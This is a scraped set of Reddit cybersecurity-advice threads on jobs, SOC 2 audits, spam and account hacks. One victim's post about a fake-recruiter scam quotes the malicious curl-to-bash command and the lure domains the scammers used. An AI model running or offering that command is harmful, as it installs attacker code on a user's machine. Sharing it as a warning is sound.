{
  "metadata": {
    "last_updated": "2026-02-05 17:09:59",
    "time_filter": "week",
    "subreddit": "CyberSecurityAdvice",
    "total_items": 17,
    "total_comments": 94,
    "file_size_bytes": 102508
  },
  "items": [
    {
      "id": "1quffxg",
      "title": "2 years of cyber internships + Sec+/Net+/CySA+ - Job market outlook?",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1quffxg/2_years_of_cyber_internships_secnetcysa_job/",
      "author": "Vegetable_Owl7189",
      "created_utc": "2026-02-03 02:18:10",
      "score": 21,
      "num_comments": 9,
      "upvote_ratio": 0.96,
      "text": "I’m graduating soon with a degree in Cybersecurity and currently working in a long-term cybersecurity internship (\\~1 year), with a previous year-long cyber internship before that. The current role is SecOps-focused (alert triage, endpoint/email security, vulnerability scanning, ServiceNow workflows), and the other focused on vulnerability management, security tooling, and exposure to compliance frameworks (HIPAA, NIST, CIS).\n\nI also hold Security+, Network+, and CySA+\n\nBest case scenario I convert to full-time where I’m currently working, but if that doesn’t happen in the next few months, I’m trying to get a realistic sense of how competitive this background is in the current market for entry-level cybersecurity roles? I’m in the US ",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1quffxg/2_years_of_cyber_internships_secnetcysa_job/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o39rl6k",
          "author": "AutoModerator",
          "text": "Hello,\n\nYour submission was automatically removed because your Reddit account does not meet our minimum karma or account age requirements. These measures help maintain the quality of posts on r/cybersecurity and prevent spam.\n\nRequirements:\n- Minimum of 20 comment karma OR 20 link karma\n- Account age of at least 10 days\n- Combined karma of at least 40\n\nTo build your karma, participate in discussions across Reddit and contribute thoughtful content in subreddits that welcome new users.\n\nIf you believe this was a mistake or have any questions, please message the mod team.\n\nThank you.\n\n*I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/CyberSecurityAdvice) if you have any questions or concerns.*",
          "score": 1,
          "created_utc": "2026-02-03 02:18:10",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3hdxvi",
          "author": "margielalos",
          "text": "You’re doing pretty good, if the role doesn’t convert you’d be a good candidate above a lot of the competition, I would start sending applications out to get a feel if it’s soon and I’d even ask your employer if they are planning to convert some of the interns so you can plan accordingly.",
          "score": 1,
          "created_utc": "2026-02-04 05:41:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3hezb7",
          "author": "That_Marionberry8881",
          "text": "It’s competitive if you don’t have any specialization of any sort to help you stand out from the crowd. Even with internship experience it’s quite hard to get your foot in the door. I hope you have good luck on your job hunt. 🍀",
          "score": 1,
          "created_utc": "2026-02-04 05:49:26",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3j174p",
          "author": "Isthmus11",
          "text": "You have great experience particularly for a new grad. The outlook is not great but you will likely be able to find something if you are willing to relocate for an in person job. Be prepared for that job to contain shift work or an on-call component or else at a company where you may be wearing several hats at once. The really desirable stuff is really, really hard to get right now",
          "score": 1,
          "created_utc": "2026-02-04 13:42:43",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3jvw0x",
          "author": "ItsAlways_DNS",
          "text": "Market is pretty competitive right now. You’ve got a slight advantage with your internship for true junior roles, but there are very few of those roles. \n\nIt’s in your best interest to try and covert to FTE at your current company.",
          "score": 1,
          "created_utc": "2026-02-04 16:14:51",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3mxcla",
          "author": "ConsciousPriority108",
          "text": "What state you are in? That matter a lot. There are a lot of cyber position in midwest and VA if you are willing to relocate.",
          "score": 1,
          "created_utc": "2026-02-05 01:09:22",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3fh7c9",
          "author": "Ok_Wishbone3535",
          "text": "If you're based in the states and are American... the outlook is rough.  Can you land a job?  It's possible but not highly probable.  You're competing against seasoned veterans laid off from FAANG, Fed/Contracting, Private industry.  You're also competing with other graduates from the previous year, because it's been that bad, even they haven't found a cyber position since graduating a year before you will.  On top of private industry offshoring/outsourcing the FUCK out of former Cyber positions in The United States.  Sending jobs to places like Hyderebad and Bengaluru India.  You'll have to stand out and be exceptional.  Or have connections.",
          "score": 0,
          "created_utc": "2026-02-03 22:55:35",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3gxma4",
          "author": "Commercial_Paint_557",
          "text": "Job market outlook very very bad\n\nRealistically your chances of ever getting a job are very low\n\nThe industry is basically being completely outsourced to India\n\nIf you dont like it, contact your senator",
          "score": -5,
          "created_utc": "2026-02-04 03:49:27",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3ki8wt",
              "author": "Dramatic_Method_3764",
              "text": "seems a few are in denial with your downvotes",
              "score": 2,
              "created_utc": "2026-02-04 17:57:35",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qs7nc8",
      "title": "We passed our security audit but I know for a fact our API security is trash, auditors just didn't look deep enough",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qs7nc8/we_passed_our_security_audit_but_i_know_for_a/",
      "author": "pogo_iscure",
      "created_utc": "2026-01-31 16:58:48",
      "score": 16,
      "num_comments": 22,
      "upvote_ratio": 1.0,
      "text": "Compliance team is celebrating because we got SOC 2 certified. Meanwhile I'm sitting here knowing that almost half of our microservices use hardcoded API keys in environment variables, we have no centralized view of which services talk to what, rate limiting exists on maybe half our endpoints, and two services are still using basic auth.\n\nThe auditors checked the boxes, looked at our policies and tested a few endpoints we prepared for them. But they never asked \"show me how you enforce this across all 200 services\" because that would reveal we don't.\n\nHow much of security compliance is actually security vs just showing documentation? Starting to feel like we're really good at writing policies and really bad at enforcing them.",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qs7nc8/we_passed_our_security_audit_but_i_know_for_a/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o2tm1ke",
          "author": "PizzaUltra",
          "text": "Compliance is not security.",
          "score": 7,
          "created_utc": "2026-01-31 17:33:14",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3698rc",
              "author": "dolcevitahunter",
              "text": "Well said!",
              "score": 1,
              "created_utc": "2026-02-02 15:55:16",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o37vkxg",
              "author": "Vivedhitha_ComplyJet",
              "text": "Exactly!  This is why we push teams to focus on controls that are actually enforced at runtime.\n\nDocs are easy to polish, but real security is in your systems. Secrets should be stored in vaults. Auth and rate limits should sit behind a gateway. Service-to-service traffic needs visibility, otherwise you’re flying blind when something breaks. And most importantly, a running inventory of the services and who’s talking to what must be kept.\n\nWhen enforcement is centralized and then automated, you’re proving that they work. That’s what most audits skip, and where breaches happen.",
              "score": 1,
              "created_utc": "2026-02-02 20:23:52",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o2v8ufe",
          "author": "IntarTubular",
          "text": "Add it to your Risk Register.\n\nScan for hardcoded API keys. \n\nEnforce key rotation.\n\nWork with developers to drive best practices.\n\nLobby for budget to remediate the issue.\n\nLots of things you can do here…",
          "score": 3,
          "created_utc": "2026-01-31 22:17:46",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2zbras",
              "author": "Free-Mango-2597",
              "text": "+1",
              "score": 1,
              "created_utc": "2026-02-01 15:12:23",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o2thany",
          "author": "Dry_Winter7073",
          "text": "Having spent a long time doing these forms of audit, end of the day the company being assessed will ALWAYS hide stuff. Fundamentally if its not part of the evidence provided it wont get logged. \n\nWhere I worked previously we used to couple paper based audits with 2 weeks of internal penetration testing and the impact to scores were so bad we had to stop doing it after 6 months due to client concerns - e.g they passed or were scored a 4 the last 3 years, now they are being scored a 1-2 or failing.",
          "score": 2,
          "created_utc": "2026-01-31 17:10:05",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2tkmzi",
          "author": "ericbythebay",
          "text": "Most security compliance is just showing documentation.  There is a reason why we include the lawyers on our pentest and red team reports.",
          "score": 2,
          "created_utc": "2026-01-31 17:26:23",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2xnjbx",
          "author": "Shreyash-kunn",
          "text": "this is depressingly common, compliance is performative theater at most companies, ive been through three soc2 audits and none of them actually caught real security issues",
          "score": 2,
          "created_utc": "2026-02-01 07:32:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "o36aycc",
              "author": "EndpointWrangler",
              "text": "And it actually does not mean that your security is in place. It means that you passed the audit.",
              "score": 1,
              "created_utc": "2026-02-02 16:03:12",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o2xny1x",
          "author": "CholeBhatureyyy",
          "text": "wait till you find out the auditors aren't even technical most of the time, they're checking if you have documentation not if the documentation reflects reality",
          "score": 2,
          "created_utc": "2026-02-01 07:36:06",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2xo7qj",
          "author": "fool_gxbi",
          "text": "\"show me how you enforce this\" question is the one auditors never ask because they know the answer is always some variation of \"we trust the developers to follow the guidelines\"\n\nwe got tired of playing security bs across microservices and started enforcing policies at the gateway level with gravitee. can't trust 47 different dev teams to remember to implement rate limiting correctly, so now the gateway just does it whether they like it or not. devs were annoyed at first but security team sleeps better",
          "score": 2,
          "created_utc": "2026-02-01 07:38:37",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2zbkwu",
          "author": "Free-Mango-2597",
          "text": "Compliance is baseline ( bare minimum).",
          "score": 2,
          "created_utc": "2026-02-01 15:11:29",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2zupvl",
          "author": "Big-Minimum6368",
          "text": "Your thinking way to securely fora audit.",
          "score": 2,
          "created_utc": "2026-02-01 16:42:02",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o33uhaf",
          "author": "goatsinhats",
          "text": "SOC2 is a bit of a joke, keep in mind the auditors want to keep you coming back to them so will work with you on the audit.\n\nAlso if they found anything would just offer a qualified report, there would be absolutely no fixes made by the auditors, or even suggestions to.\n\nAs for your concerns would advise you to be very careful how loudly and who you voice them too. You want to push for positive change, highlight the value of it, and only tell the harsh truth if you’re truly in a position to influence change.\n\nThe easiest way for a company that doesn’t take security seriously to solve the issue is get rid of the people bringing it up. \n\nJust wait till the people using the API run a pen test against them, or on the spot demand proof of a certain policy, that’s when change happens",
          "score": 2,
          "created_utc": "2026-02-02 05:16:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o2yecnh",
          "author": "waywardworker",
          "text": "It's fun to see how the sausage is made isn't it.\n\n\nNow think about every time you looked at a product certification and thought that it meant something.",
          "score": 1,
          "created_utc": "2026-02-01 11:38:01",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o369k6j",
          "author": "dennisthetennis404",
          "text": "You just described the entire industry's dirty secret and yes, SOC 2 audits policies on paper, not actual enforcement! Work on your API security. Use a platform that enforces your policies and consolidates tools.",
          "score": 1,
          "created_utc": "2026-02-02 15:56:44",
          "is_submitter": false,
          "replies": [
            {
              "id": "o36b0s4",
              "author": "EndpointWrangler",
              "text": "True that!",
              "score": 1,
              "created_utc": "2026-02-02 16:03:31",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o39e2n5",
          "author": "Majestic_Race_8513",
          "text": "What you just described isn’t just a bad audit. It’s also someone from your company committing fraud. You can’t lie about what gets included in your report \n\nAnd most of what you listed there wouldn’t be included if you’re just looking at common criteria",
          "score": 1,
          "created_utc": "2026-02-03 01:01:18",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3aidp3",
          "author": "f98b07b",
          "text": "We do a lot of third-party and vendor reviews on behalf of our clients. We basically ignore most of the compliance audits especially SOC 2 Type I and II. We go deep instead asking for evidence of a security program, frameworks, SAST/SCA/DAST, pen-testing, threat modeling, and the whole nine yards. A basic SAST scan would reveal those hard-code API keys in your code. \n\nMy suggestion is to put in place at least a SAST/SCA scanner, scan the code, provide evidence of the hardcoded API keys, attach the CVSS score to it and put the whole thing in a Jira ticket. At least it is documented and it's a good CYA for you. Then you go and talk to the VP of engineering.",
          "score": 1,
          "created_utc": "2026-02-03 05:05:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3gem56",
          "author": "Double-Familiar",
          "text": "SOC2 is for compliance and audit, not for security.\n\nIt is worthless.  PCI-DSS has more security aspects than SOC2.\n\nSOC2 is usually aimed at medium sized businesses.\n\nSOC2 is trash.",
          "score": 1,
          "created_utc": "2026-02-04 01:59:28",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qvo8wp",
      "title": "Any advice for a fresher in cybersecurity?",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qvo8wp/any_advice_for_a_fresher_in_cybersecurity/",
      "author": "Necessary-Tip-2734",
      "created_utc": "2026-02-04 13:14:46",
      "score": 13,
      "num_comments": 20,
      "upvote_ratio": 0.93,
      "text": "I am currently a first year student doing a BE in cybersecurity. I was thinking of going for masters. I know it's still too early for me to be asking this but what kind of projects or certificates should I be working towards to get a job after college?",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qvo8wp/any_advice_for_a_fresher_in_cybersecurity/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o3j4sim",
          "author": "cyberguy2369",
          "text": "get a job in tech.. today.. real world in person job experience trumps anything you can do at home (certs, homelab, etc)\n\nwalk over to the IT dept of your university \"hi I'm a cyber security student looking for a experience and a job, what kind of opportunities are available on campus? \"\n\nthen walk over to the cyber security dept on campus \"hi I'm a cyber security student looking for a experience and a job, what kind of opportunities are available on campus? \"",
          "score": 10,
          "created_utc": "2026-02-04 14:02:04",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3kqnkt",
              "author": "CreaTeBear",
              "text": "Please do this if you’re in college! I have an info sec job now because I worked for my colleges IT department part time for 2 years. Nobody ever thinks about doing this because they’re chasing internships elsewhere. I’m sure they have something open for student workers at almost any college",
              "score": 4,
              "created_utc": "2026-02-04 18:35:34",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o3plcan",
                  "author": "Dr3xii",
                  "text": "would you recommend an in internship or working for your school ?",
                  "score": 1,
                  "created_utc": "2026-02-05 13:09:15",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o3jbrby",
          "author": "S4LTYSgt",
          "text": "Dont get a masters until you are Mid-year. \nWait like 5-10 years after you have solid experience. \n\nCerts are not something you should worry about right now. Focus on your studies. Build core IT Skills. Learn from your classes. \n\nAsk chatgpt “what kind of projects can I work on while. College student, here are the resources I have available, here is my budget(if you have any budget) or for free.” \n\nDont those labs towards your junior year. You still need to build skills. Heck you might end up like cloud or something else. Just focus on school for now. No need to rush, IT is a long term career",
          "score": 6,
          "created_utc": "2026-02-04 14:38:29",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3n5x1p",
              "author": "its_all_bueno_here",
              "text": "I second waiting on certs for now. Especially since the cost of a certification may be covered by your employer. Focus on projects and document your leanings in a blog",
              "score": 1,
              "created_utc": "2026-02-05 01:58:47",
              "is_submitter": false,
              "replies": []
            },
            {
              "id": "o3pm7ka",
              "author": "Dr3xii",
              "text": "Id acc disagree, wouldnt it make sense to get certs and do labs so you can land an entry level like a SOC? I mean getting a masters with 0 hands on experience would be questionable",
              "score": 1,
              "created_utc": "2026-02-05 13:14:31",
              "is_submitter": false,
              "replies": [
                {
                  "id": "o3qg4wt",
                  "author": "S4LTYSgt",
                  "text": "Not now. He is a first year college student. Sec+ and Blue Team 1 maybe his senior year. But cyber isnt entry level anyways. Most SOC positions require some IT/Tech experience. But the labs and stuff he can do like sophmore junior year to help land internships. Its too early to do certs and all of that",
                  "score": 1,
                  "created_utc": "2026-02-05 15:51:30",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o3iyq3s",
          "author": "Sivyre",
          "text": "It’s not so much the certs that will get you a job per se, it’s more so the networks you establish through available resources during your program that speak volumes. Make use of the schools partnerships to establish internships and coops when the time comes to help get you foot in the door to get experience which is of so much more value than a cert.\n\nIn the meantime read and study the A+, Sec+ and Network+ (can skip the ones you know or skim through) but don’t yet challenge the exams. The content is freely available on YouTube and elsewhere on the internet but they will set the tone and contain the foundations of what someone in cybersecurity would need to know.\n\nDon’t worry about projects unless you have an idea and a deep desire but I would hope your institution has a capstone to do before graduation and that will be your project.\n\nYou’re in your first year so I always advise to not worry about these things until it is clear that this is what you want. I don’t know the statistics but from personal experience in that first year I watched probably close to 40% of my classmates drop out or switch later and they too were all concerned for the certs and future prospects until it dawned on them that CS wasn’t for them.",
          "score": 4,
          "created_utc": "2026-02-04 13:28:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3jlco0",
          "author": "Various_Afternoon_56",
          "text": "Get some project going, and some intern first. As for the cert. Cissp is a good one that most go for.",
          "score": 2,
          "created_utc": "2026-02-04 15:26:01",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3lmlok",
              "author": "CausesChaos",
              "text": "Yeah it's not a beginner cert though",
              "score": 1,
              "created_utc": "2026-02-04 21:05:06",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o3k3yqg",
          "author": "jirajockey",
          "text": "I always tell noobs to the industry to get an entry level in SOC/NOC, hosting, networking etc.  \nAs for certs that interest me in a candidate, Network +, Linux + and Security + in that order.  \nI'm on a hiring freeze right now, my team of security analysts (remeadiation/networking/firewall) L2-L4s, are a \"feed\" to the Research, SOC and NOC teams. I \"feed\" from the L1 Hosting account managers.  \nAnd I love to see a healthy github of associated projects or involvment in others.",
          "score": 2,
          "created_utc": "2026-02-04 16:51:54",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3oz0xv",
              "author": "Necessary-Tip-2734",
              "text": "My parents have been telling me to do an internship in the second year itself. But I don't know much yet. Could you please tell me what they will look at while hiring as I don't think I can build any projects or stuff right now. I have thought to do the google cybersecurity cert from coursera tho",
              "score": 2,
              "created_utc": "2026-02-05 10:15:16",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o3pqdpl",
                  "author": "jirajockey",
                  "text": "If the school can get you a meaningful internship that's great, I know UNB (local uni) has such programs, but our company has never offered such places, UNB are always asking me. I know some smaller local security companies do offer internships, beauceron, bulletproof and the local power company which look \"meaningful\".  \nWe try to get the kids involved in our local BSides, a good way to meet other employers. Google cybersecurity sounds like a good addition.  \nProjects can be simple bash/python scripts, for example one of my hires made a short course on how to set up spf, dkim and dmark, not exactly unique content, but I liked the attention to detail and the presentation, not really related to the role.",
                  "score": 1,
                  "created_utc": "2026-02-05 13:38:43",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o3kms15",
          "author": "Affectionate-Cod8134",
          "text": "Do a master degree \nDo at least one valuable certification (pls not comptia sec+)\nBuild things\nHost a blog\nDo CTFs\nMake writups\nDo bug bounty\nRoses are red\nViolets are blue\nCybersecurity market is saturated\nYou will struggle too",
          "score": 2,
          "created_utc": "2026-02-04 18:18:06",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3pmubq",
              "author": "Dr3xii",
              "text": "why not sec+???",
              "score": 1,
              "created_utc": "2026-02-05 13:18:16",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o3j79xb",
          "author": "arihoenig",
          "text": "It's never too soon to be doing projects. You should have been doing projects since middle school, ideally. If you had been doing that, then certifications would be unnecessary.",
          "score": 4,
          "created_utc": "2026-02-04 14:15:13",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3lbnuf",
          "author": "Kilow102938",
          "text": "Good luck \n\nBeen trying for a bit after working as a network admin, knocking out network plus, associates in networking and bachelor in security, CEH, 1 year help desk,  4 years information security specialist is cryptography for card payment systems and then now 6 years with information security analyst 2 for reviews APIs before going into production. \n\nNETWORK!!! Attend what you can and meet people. \n\nLife is about who ya know not what you know.\\\nIdc who argues that I know some stupid people in positions they don't belong in because they know someone.",
          "score": 1,
          "created_utc": "2026-02-04 20:12:56",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3op5cp",
          "author": "Ordinary-Ad-3670",
          "text": "sec+ is needed for a lot of roles and a good place to start, get it like a year before you graduate  \nbachelors is all you need to get working and the experience will do you better than a masters\n\nbecome friends with your teachers, the good ones, trust\n\nadvice; winners stop posting, take all the doomscrolling with a grain of salt, there is work, finish your degree and learn as much as you can. the highly motivated individuals will be in your university's clubs and soc programs. join them and compete/learn with them.",
          "score": 1,
          "created_utc": "2026-02-05 08:39:42",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3luxri",
          "author": "Individual-Meet-6271",
          "text": "Its not early to ask for this. I would say you should get a ”hiring signal” certificate like Security+/ CySa or whatever suits your path best. \n\nAnd then you should back it up with hands on homelabs that you similulate in your OWN enviroment, not online labs.\n\nWith this method, you balance both looking attractive for a hiring manager whilst also getting the knowledge and experience",
          "score": 0,
          "created_utc": "2026-02-04 21:44:51",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qvypkr",
      "title": "Huge spam of \"attempted logins\" from Zendesk addresses",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qvypkr/huge_spam_of_attempted_logins_from_zendesk/",
      "author": "nkarl7",
      "created_utc": "2026-02-04 19:44:51",
      "score": 10,
      "num_comments": 6,
      "upvote_ratio": 0.92,
      "text": "As per title, I've been receiving tens of (what I believe to be) phishing attempts from services using Zendesk emails, such as Codecademy, Dropbox, Medium and others.\n\nThey're all in the form of either:\n\n* An account already exists for <x> using this email address. To access it, you can sign in or reset your password.\n* Welcome to <x>. Complete your sign-up to activate and access your account.\n\nMail headers and links seem legit at first glance, so beware.",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qvypkr/huge_spam_of_attempted_logins_from_zendesk/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o3l9n8b",
          "author": "jackun",
          "text": "At least Gmail spam filter started to work now",
          "score": 1,
          "created_utc": "2026-02-04 20:02:52",
          "is_submitter": false,
          "replies": [
            {
              "id": "o3m4fml",
              "author": "nkarl7",
              "text": "Yeah, I've noticed that as well  \nUnfortunately a lot of them are still going through",
              "score": 1,
              "created_utc": "2026-02-04 22:31:26",
              "is_submitter": true,
              "replies": []
            }
          ]
        },
        {
          "id": "o3ld9gv",
          "author": "Exagone313",
          "text": "I'm affected by this too, on my Git email that is generally used by spammers.",
          "score": 1,
          "created_utc": "2026-02-04 20:20:34",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3m3n04",
          "author": "nkarl7",
          "text": "As an additional detail, the spammers seem to always append an alias to your address.  \ne.g.: \"yourmailhere+somecharacters\"",
          "score": 1,
          "created_utc": "2026-02-04 22:27:25",
          "is_submitter": true,
          "replies": [
            {
              "id": "o3m68x5",
              "author": "kttmt",
              "text": "I got something like myname+epstein@gmail.com :/",
              "score": 1,
              "created_utc": "2026-02-04 22:40:39",
              "is_submitter": false,
              "replies": []
            }
          ]
        }
      ]
    },
    {
      "id": "1qrwi9g",
      "title": "Video call scam attempt",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qrwi9g/video_call_scam_attempt/",
      "author": "DentistFan",
      "created_utc": "2026-01-31 08:02:34",
      "score": 9,
      "num_comments": 10,
      "upvote_ratio": 1.0,
      "text": "I believe I was the victim of a plan to install something on my machine.\n\nA few days ago, a recruiter named Anurag singh bundela (https://www.linkedin.com/in/anurag-singh-bundela-62abba184/) approached me on LinkedIn with a job role in BitGet (his profile says that he is working in BitGet). Discussions were smooth and he shared with me his Calendly in order to book an initial discussion about the role, the team etc (standard practice)\n\nHe shared with me a link to join the video call, which was \\`https://bitget-meeting.com/meet/934050553811?p=2eFFrUchalpVywTExG\\`.  I joined the call and the environment was identical to MS Teams. He joined after 3 mins but the video was frozen. I got a popup saying that you might have to install a driver to properly show video and audio for MS Teams. I stupidly clicked on the link \\`https://learn.bitget-meeting.com/en-us/troubleshoot/microsoftteams/teams-on-mac/teams-audio-issue-mac\\`, which was identical again to Microsoft webpages, and executed the following\n\n    /bin/bash -c \"$(curl -fsSL https://apple.driver-update.io/troubleshoot/mac/audio-issue-fix.sh)\"\n\nThe recruiter asked me for my phone number to call me and I had a 20 mins discussion about the role with an AI bot...\n\nAfter I stopped talking to it, I froze. I understood what I had done and decided to wipe the script and the downloaded binary from everywhere. ChatGPT was very helpful with the process and immediately identified that this script does indeed look harmful.\n\nI would like to ask you what more can I do to make sure that the downloaded binary did not install anything on my machine or my browser that might exfiltrate data? I have already checked:\n\n* Brave extensions\n* Removed the folder created by the sh script\n* I deleted the \\`coreaudiod\\` file. It cannot be found anywhere on my machine. No mention of \\`apple.driver-update.io\\` driver\n* No weird LaunchAgents or LaunchDaemons\n* Uninstalled Teams and Zoom (should have done this a long time ago)\n* Installed LuLu, NetIQuette and KnockKnock (no weird things there)",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qrwi9g/video_call_scam_attempt/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o2rf8gw",
          "author": "Toastti",
          "text": "You need to reinstall your operating system. That's clearly a virus and no telling what it did. \n\nUse a DIFFERENT computer to make a USB recovery stick and reinstall the OS",
          "score": 4,
          "created_utc": "2026-01-31 09:00:22",
          "is_submitter": false,
          "replies": [
            {
              "id": "o2rih3y",
              "author": "DentistFan",
              "text": "Are files from my machine safe to transfer to the new OS? Like pdfs, mp4s etc? ",
              "score": 1,
              "created_utc": "2026-01-31 09:31:25",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o2rnzmd",
                  "author": "SecTechPlus",
                  "text": "Generally yes, but after putting them on a USB drive it would be a good idea to virus scan them before copying back into your newly reinstalled OS.",
                  "score": 5,
                  "created_utc": "2026-01-31 10:24:24",
                  "is_submitter": false,
                  "replies": []
                },
                {
                  "id": "o2va2uo",
                  "author": "Groundbreaking_Rock9",
                  "text": "It can never be guaranteed, without a full forensic audit",
                  "score": 1,
                  "created_utc": "2026-01-31 22:24:02",
                  "is_submitter": false,
                  "replies": []
                }
              ]
            }
          ]
        },
        {
          "id": "o2yx0y4",
          "author": "DentistFan",
          "text": "I created a USB recovery stick from another machine, wiped clean disk drive, installed Tahoe. Now, I am in the process of rotating all passwords, API keys etc. Better safe than sorry ",
          "score": 2,
          "created_utc": "2026-02-01 13:51:53",
          "is_submitter": true,
          "replies": []
        },
        {
          "id": "o2rwqr0",
          "author": "DentistFan",
          "text": "I am using macOS. Would you suggest a recoverable usb stick from a different machine?",
          "score": 1,
          "created_utc": "2026-01-31 11:44:16",
          "is_submitter": true,
          "replies": [
            {
              "id": "o2u8o7d",
              "author": "Toastti",
              "text": "Ideally yes. If you can't do that you can use the recovery mode, wipe the drive, and download a new image from the internet on the same Mac. But it's not as safe",
              "score": 2,
              "created_utc": "2026-01-31 19:20:02",
              "is_submitter": false,
              "replies": []
            }
          ]
        },
        {
          "id": "o3bkqzz",
          "author": "drevmbrevker",
          "text": "Did you save the content of audio-issue-fix.sh? You could have shared it on some subs or forums and people d look at it and tell you whate xactly it does and what you have to worry about so you dont have to wipe out and sort all system and files, which still can contain something and infect your machine again as fast as you connect to internet with new setup. I never used mac and dont know anything about its security tho",
          "score": 1,
          "created_utc": "2026-02-03 10:49:47",
          "is_submitter": false,
          "replies": []
        },
        {
          "id": "o3nn1ed",
          "author": "thedatarat",
          "text": "I agree with the other user, share it in forums or discords see if anyone can help identify what the script did",
          "score": 1,
          "created_utc": "2026-02-05 03:38:04",
          "is_submitter": false,
          "replies": []
        }
      ]
    },
    {
      "id": "1qtjrkj",
      "title": "My Google account was hacked, and the hacker still has access to my accounts even after I reset my password.",
      "subreddit": "CyberSecurityAdvice",
      "url": "https://www.reddit.com/r/CyberSecurityAdvice/comments/1qtjrkj/my_google_account_was_hacked_and_the_hacker_still/",
      "author": "Due_Builder9420",
      "created_utc": "2026-02-02 03:20:32",
      "score": 8,
      "num_comments": 19,
      "upvote_ratio": 0.72,
      "text": "What to do??? He continues to access Roblox, Disney, etc., even after changing his Google password and the passwords for the apps he uses. ",
      "is_original_content": false,
      "link_flair_text": null,
      "permalink": "https://reddit.com/r/CyberSecurityAdvice/comments/1qtjrkj/my_google_account_was_hacked_and_the_hacker_still/",
      "domain": "self.CyberSecurityAdvice",
      "is_self": true,
      "comments": [
        {
          "id": "o33eflf",
          "author": "OkStudent8414",
          "text": "How do you know that they are accessing all those apps? Did you use the same password to access all those apps? or did you use the google sign on to access all the apps? If you didn't make google log off your account when you changed the password the other person can still have access. Go to your Google Account's Security settings, find the \"Your devices\" section, select \"Manage all devices,\" and then sign out of each device or session listed; you must do this for every device to ensure all access is removed, and changing your password afterward provides extra security.",
          "score": 10,
          "created_utc": "2026-02-02 03:30:35",
          "is_submitter": false,
          "replies": [
            {
              "id": "o33eqgv",
              "author": "Due_Builder9420",
              "text": "I've already done all that, and he's still accessing it. I've already removed the login from each device and changed the password.",
              "score": 2,
              "created_utc": "2026-02-02 03:32:25",
              "is_submitter": true,
              "replies": [
                {
                  "id": "o368s75",
                  "author": "dennisthetennis404",
                  "text": "Force the logout!",
                  "score": 2,
                  "created_utc": "2026-02-02 15:53:09",
                  "is_submitter": false,
                  "replies": []
                }
